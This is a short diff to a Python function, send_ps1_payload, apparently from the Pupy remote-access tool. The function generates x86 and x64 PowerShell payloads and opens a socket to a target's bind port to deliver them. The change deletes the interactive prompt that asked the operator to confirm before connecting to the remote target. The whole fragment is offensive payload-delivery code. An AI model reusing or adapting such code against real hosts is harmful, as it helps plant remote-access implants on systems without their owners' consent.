@@ -214,7 +214,6 @@ def send_ps1_payload(conf, bind_port, target_ip, nothidden=False):
     output_x64 = pupygen.generate_ps1(conf, output_dir=tmpfile, x64=True)
     ps1_x86 = open(output_x86).read()
     ps1_x64 = open(output_x64).read()
-    raw_input("[?] Press <enter> if you are ready to connect (to remote target)")
     print colorize("[+] ","green")+"Connecting to {0}:{1}".format(target_ip, bind_port)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((target_ip, int(bind_port)))
